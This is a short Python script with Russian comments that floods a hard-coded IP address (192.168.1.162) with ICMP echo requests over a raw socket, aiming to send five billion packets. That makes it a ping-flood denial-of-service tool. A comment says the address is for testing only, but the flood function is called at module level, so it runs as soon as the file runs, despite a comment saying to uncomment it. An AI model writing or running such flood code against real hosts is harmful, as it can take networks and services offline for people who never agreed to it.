import socket
import time
import random

target_ip = "192.168.1.162"  # ТОЛЬКО тестовый IP
packet_count = 5000000000

def socket_ping_flood():
    for i in range(packet_count):
        try:
            # Создание raw socket (требует прав администратора)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # Простой ICMP пакет (эхо-запрос)
            packet = b'\x08\x00\xf7\xff\x00\x00\x00\x00'  # Базовый ICMP пакет
            
            sock.sendto(packet, (target_ip, 0))
            print(f"Отправлен пакет {i+1}/{packet_count}")
            sock.close()
            
        except PermissionError:
            print("❌ Требуются права администратора!")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            break
        
socket_ping_flood()  # Раскомментируйте для использования
